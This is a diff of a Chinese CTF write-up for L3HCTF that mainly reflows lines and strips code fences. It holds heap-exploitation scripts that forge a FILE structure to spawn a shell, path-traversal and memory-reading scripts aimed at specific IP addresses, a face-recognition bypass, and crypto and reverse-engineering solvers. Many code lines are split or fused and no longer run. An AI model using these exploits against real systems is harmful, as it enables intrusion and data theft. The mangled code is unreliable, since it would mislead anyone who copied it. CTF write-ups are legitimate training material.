@@ -91,13 +91,16 @@ swap ? with  ? ? ?
 
 欢迎师傅们加入我们:
 
-星盟安全团队纳新群1:222328705
+星盟安全团队纳新群1:
+222328705
 
-星盟安全团队纳新群2:346014666
+星盟安全团队纳新群2:
+346014666
 
 有兴趣的师傅欢迎一起来讨论!
 
-PS:团队纳新简历投递邮箱：
+PS:
+团队纳新简历投递邮箱：
 
 xmcve@qq.com
 
@@ -155,12 +158,17 @@ while1:
         wfile_jump = libc.address + 0x202228
         fake_io = flat({
                 0x0:b' sh',
-                0xa0:p64(stdout),
-                0x10:p64(libc.symbols['system']),
-                0x20:p64(stdout),
+                0xa0:
+p64(stdout),
+                0x10:
+p64(libc.symbols['system']),
+                0x20:
+p64(stdout),
                 0xd8: p64(wfile_jump + 0x48 - 0x38),
-                0x88:p64(stdout-0x30),
-                0xe0:p64(stdout-8),
+                0x88:
+p64(stdout-0x30),
+                0xe0:
+p64(stdout-8),
         },filler=b'x00')
         dele(1)
         add(1, 8, p64(heapbase+0x10))
@@ -173,13 +181,9 @@ while1:
         add(1, 0x3f0, p64(0)*2+fake_io)
         p.interactive()
         break
-    except:
+    
+except:
         p.close()
-```
-
-
-
-```
 from pwn import *
 
 def add(idx, size, content=b'a'):
@@ -229,12 +233,17 @@ stdout = libc.address + 0x2045c0
 wfile_jump = libc.address + 0x202228
 fake_io = flat({
         0x0:b' sh',
-        0xa0:p64(stdout),
-        0x10:p64(libc.address+0x582d2),
-        0x20:p64(stdout),
+        0xa0:
+p64(stdout),
+        0x10:
+p64(libc.address+0x582d2),
+        0x20:
+p64(stdout),
         0xd8: p64(wfile_jump + 0x48 - 0x38),
-        0x88:p64(stdout-0x30),
-        0xe0:p64(stdout-8),
+        0x88:
+p64(stdout-0x30),
+        0xe0:
+p64(stdout-8),
 },filler=b'x00')
 pay1 = b''
 pay1 = p16(0)*((0x400-0x20)//0x10)+p16(1)
@@ -243,11 +252,6 @@ add(2, 0x280, pay1)
 dele(1)
 add(1, 0x3f0, p64(0)*2+fake_io)
 p.interactive()
-```
-
-
-
-```
 worker_processes 1;
 
 events {
@@ -265,9 +269,12 @@ http {
     init_by_lua_block {
         f = io.open("/flag", "r")
         f2 = io.open("/password", "r")
-        flag = f:read("*all")
-        password = f2:read("*all")
-        f:close()
+        flag = f:
+read("*all")
+        password = f2:
+read("*all")
+        f:
+close()
         password = string.gsub(password, "[nr]", "")
         os.remove("/flag")
         os.remove("/password")
@@ -332,30 +339,24 @@ http {
                 if length > 1024 * 1024 then
                     length = 1024 * 1024
                 end
-                f:seek("set", start)
-                local content = f:read(length)
-                f:close()
+                f:
+seek("set", start)
+                local content = f:
+read(length)
+                f:
+close()
                 ngx.say(content)
                 ngx.header["Content-Type"] = "application/octet-stream"
             }
         }
     }
 }
-```
-
-
-
-```
 local blacklist = {"%.", "/", ";", "flag", "proc"}
 local args = ngx.req.get_uri_args()
-```
-
-
-
-```
 import requests
 
-url = "http://1.95.8.146:17794/download"
+url = "http://1.95.8.146:
+17794/download"
 filename = "../proc/self/fd/6"# 目标文件路径
 
 params = {f"a{i}": str(i) for i in range(1, 101)}
@@ -379,7 +380,8 @@ def read_file_byte_by_byte(url, params, max_bytes=1024*1024):
             else:
                 print(f"[!] 状态码 {r.status_code}，停止读取")
                 break
-        except Exception as e:
+        
+except Exception as e:
             print(f"[!] 请求异常: {e}")
             break
 
@@ -389,19 +391,16 @@ if __name__ == "__main__":
     data = read_file_byte_by_byte(url, params, max_bytes=1024)
     print("读取内容：")
     print(data.decode(errors='ignore'))
-```
-
-
-
-```
 import requests
 import re
 import time
 
 # === 配置项 ===
-TARGET = "http://43.138.2.216:17794/read_anywhere"
+TARGET = "http://43.138.2.216:
+17794/read_anywhere"
 PASSWORD = "passwordismemeispasswordsoneverwannagiveyouup"
-CHUNK_SIZE = 4096# 每次读取的字节数
+CHUNK_SIZE = 4096
+# 每次读取的字节数
 FLAG_PREFIX = b"L3HCTF{"
 
 # === 读取 maps ===
@@ -451,7 +450,8 @@ def search_flag_in_mem(ranges):
                 if FLAG_PREFIX in data:
                     index = data.find(FLAG_PREFIX)
                     # 简单截断 flag（直到遇到右大括号或 50 字节以内）
-                    tail = data[index:index + 50]
+                    tail = data[index:
+index + 50]
                     match = re.search(rb'L3HCTF{[^}]{1,48}}', tail)
                     if match:
                         print(f"n🎉 找到 flag: {match.group(0).decode()}")
@@ -460,7 +460,8 @@ def search_flag_in_mem(ranges):
                         print(f"[?] 找到前缀但无法确定完整 flag: {tail}")
                         returnTrue
                 offset += size
-            except Exception as e:
+            
+except Exception as e:
                 print(f"[!] 请求异常: {e}")
                 break
     print("[-] 未找到 flag")
@@ -471,17 +472,7 @@ if __name__ == "__main__":
     found = search_flag_in_mem(ranges)
     ifnot found:
         print("[-] flag 未找到")
-```
-
-
-
-```
 es = requests.get(f"http://127.0.0.1/get_last_ip/{username}")
-```
-
-
-
-```
 import requests
 import random
 import string
@@ -547,17 +538,7 @@ def exploit():
 
 if __name__ == "__main__":
     exploit()
-```
-
-
-
-```
 pip install torch torchvision fastapi uvicorn pillow numpy
-```
-
-
-
-```
 import torch
 import torch.nn as nn
 import torch.optim as optim
@@ -612,19 +593,10 @@ gen_image = gen_image.permute(1, 2, 0).numpy()  # 转为HWC格式
 gen_image = (gen_image * 255).astype(np.uint8) 
 Image.fromarray(gen_image).save('generated_image.png')
 print("Generated image saved as 'generated_image.png'")
-```
-
-
-
-```
-curl -X POST "http://1.95.8.146:50001/signin/" -H "Content-Type: multipart/form-data" -F "file=@generated_image.png"
+curl -X POST "http://1.95.8.146:
+50001/signin/" -H "Content-Type: multipart/form-data" -F "file=@generated_image.png"
 
 {"status":"L3HCTF{f4c3_r3c0gn1t10n_15_n0t_s0_s3cur3_4ft3r_4ll}"}
-```
-
-
-
-```
 from Crypto.Util.number import *
 import gmpy2
 
@@ -653,11 +625,6 @@ q = n // p // r
 d = inverse(65537,(p-1)*(q-1)*(r-1))
 m = pow(c,d,n)
 print(long_to_bytes(m))
-```
-
-
-
-```
 import itertools
 from Crypto.Util.number import *
 
@@ -740,11 +707,6 @@ def decrypt(c_poly, N, d):
 
 m = decrypt(c,N,d)
 print(long_to_bytes(int(m)))
-```
-
-
-
-```
 import sympy
 from ecdsa import NIST256p
 
@@ -797,13 +759,8 @@ private_key = list(roots.keys())[0]
 
 print(f"Found private key (d): {private_key}")
 print(f"The flag is: L3HCTF{{{private_key}}}")
-```
-
-
-
-```
-#include<stdio.h>
-#include"defs.h"
+    #include<stdio.h>
+    #include"defs.h"
 usingnamespacestd;
 int main(){
 unsignedchar  enc[256]; // x20
@@ -844,19 +801,14 @@ unsignedchar aDghpc2lzywtleq[] =
     }
 //L3HCTF{ez_rust_reverse_lol}
 }
-```
+    #include <stdio.h>
+    #include <stdint.h>
+    #include <string.h>
+    #include <openssl/md5.h>
 
-
-
-```
-#include <stdio.h>
-#include <stdint.h>
-#include <string.h>
-#include <openssl/md5.h>
-
-#define TMIN   1751990400u
-#define TMAX   1752052051u
-#define TARGET "8a2fc1e9e2830c37f8a7f51572a640aa"
+    #define TMIN   1751990400u
+    #define TMAX   1752052051u
+    #define TARGET "8a2fc1e9e2830c37f8a7f51572a640aa"
 
 staticuint32_t rng_state;
 
@@ -925,22 +877,12 @@ int main(void)
     puts("扫描完毕，未命中目标。");
     return0;
 }
-```
-
-
-
-```
 sbox = [0x122F2C9C, 0xE3BCCAE7, 0xD0FFC0F2, 0xD9A12544, 0x8A27992F,
         0x55B1B935, 0x9110B161, 0x92811564, 0x5CE9B359, 0x77C79A51,
         0x4265527A, 0x8AB57C4B, 0x11529FA4, 0x9D9F63FF, 0xA970B936,
         0xC8EABA0D, 0x9A0EB4AA, 0xB0BC6E7F, 0x9784B100, 0x70DCD3AE,
         0x6057A44E, 0x89187658, 0xE00098A8, 0x45773540, 0xF9374F1A,
         0x913FA548]
-```
-
-
-
-```
 1️⃣ 单块测试
 明文: b'09876543'
 明文(hex): 3039383736353433
@@ -966,11 +908,6 @@ S盒长度: 26
 S盒前8个值: ['0x122f2c9c', '0xe3bccae7', '0xd0ffc0f2', '0xd9a12544', '0x8a27992f', '0x55b1b935', '0x9110b161', '0x92811564']
 唯一值数量: 26/26
 平均值: 2366628618 (0x8d0fe309)
-```
-
-
-
-```
 def a32small(byte_array):
     """字节数组转32位小端整数数组"""
     return [int.from_bytes(byte_array[i:i + 4], byteorder='little', signed=False) for i in range(0, len(byte_array), 4)]
@@ -992,12 +929,14 @@ sbox = [0x122F2C9C, 0xE3BCCAE7, 0xD0FFC0F2, 0xD9A12544, 0x8A27992F,
 
 def ROL32(x, shift):
     """32位循环左移"""
-    shift = shift & 31# 确保shift在0-31范围内
+    shift = shift & 31
+# 确保shift在0-31范围内
     return ((x << shift) | (x >> (32 - shift))) & 0xFFFFFFFF
 
 def ROR32(x, shift):
     """32位循环右移"""
-    shift = shift & 31# 确保shift在0-31范围内
+    shift = shift & 31
+# 确保shift在0-31范围内
     return ((x >> shift) | (x << (32 - shift))) & 0xFFFFFFFF
 
 def feistel_encrypt(plaintext_bytes):
@@ -1128,7 +1067,8 @@ def main():
     try:
         ascii_result = decrypted_result.decode('ascii', errors='ignore')
         print(f"ASCII解析: '{ascii_result}'")
-    except:
+    
+except:
         print("无法解析为ASCII")
 
     # 测试3: 长文本加密解密
@@ -1171,7 +1111,8 @@ def analyze_sbox():
 
     # 检查值的分布
     avg_val = sum(sbox) / len(sbox)
-    print(f"平均值: {avg_val:.0f} (0x{int(avg_val):08x})")
+    print(f"平均值: {avg_val:.0f} (0x{int(avg_val):
+08x})")
 
 if __name__ == "__main__":
     main()
@@ -1180,11 +1121,6 @@ if __name__ == "__main__":
     # 如果有已知的明文密文对，可以用这个函数验证
     # known_pairs = [(b"testdata", bytearray.fromhex("..."))]
     # crack_known_plaintext(known_pairs)
-```
-
-
-
-```
 好的，我们来分析这段来自CTF逆向工程（Reverse Engineering）挑战的伪代码。这看起来像是用IDA Pro之类的工具从一个用Go语言编写的贪吃蛇游戏中反编译出来的C伪代码。
 
 代码的核心逻辑是，flag并不是在满足某个特定条件（比如分数达到100）时才显示，而是在每次吃到食物时，都会被“解密”一次。 你需要正确地进行游戏，才能在最后得到完全解密的flag。
@@ -1213,11 +1149,6 @@ if ( *v51 == v49 && v51[1] == n3 )
 if ( *v51 == v49 && v51[1] == n3 ): 这是一个条件判断。v51 指向的是蛇头的坐标，而 v49 和 n3 是食物的坐标。这个 if 语句的作用就是判断蛇头是否碰到了食物。
 ++*(_QWORD *)(v25 + 32);: 如果蛇吃到了食物，这行代码就会执行。它将 v25 指针偏移 32 字节位置的值加一。
 结论: 分数（Score）就存储在 v25 所指向的蛇结构体偏移 32 字节的位置。每次吃到食物，这个值就会 +1。
-```
-
-
-
-```
 void decrypt(uint32_t* v, uint32_t* k, int round) {
     uint32_t delta = 0x11223344;                     /* a key schedule constant */
 
@@ -1271,11 +1202,6 @@ int main() {
     char* flag = (char*)v9;
     printf("%s", v9);
 }
-```
-
-
-
-```
 unsigned short encccc[] = { 243,130,6,509,336,56,178,222,346,407,156,471,110,40,326,151 };
     for (int i = 0; i < 16; i++) {
         encccc[i] -= 20;
